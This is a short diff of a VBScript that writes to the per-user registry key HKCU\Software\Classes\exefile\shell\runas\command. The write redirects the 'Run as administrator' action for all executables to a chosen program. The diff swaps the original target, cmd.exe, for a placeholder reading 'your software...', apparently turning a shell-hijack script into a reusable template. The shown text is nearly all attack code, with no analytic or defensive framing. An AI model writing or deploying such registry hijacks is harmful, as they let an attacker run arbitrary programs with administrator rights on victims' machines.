@@ -9,7 +9,7 @@ dim fso
 dim Directory, CurrentDirectory, Dr2
 Set fso = CreateObject("Scripting.FileSystemObject")
 CurrentDirectory = fso.GetAbsolutePathName(".")
-Directory = "C:\Windows\System32\cmd.exe"
+    Directory = "your software..."
 Set objSh = WScript.CreateObject ("WScript.Shell")
 Set WshShell = WScript.CreateObject("WScript.Shell")
 WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\", Directory, "REG_SZ"
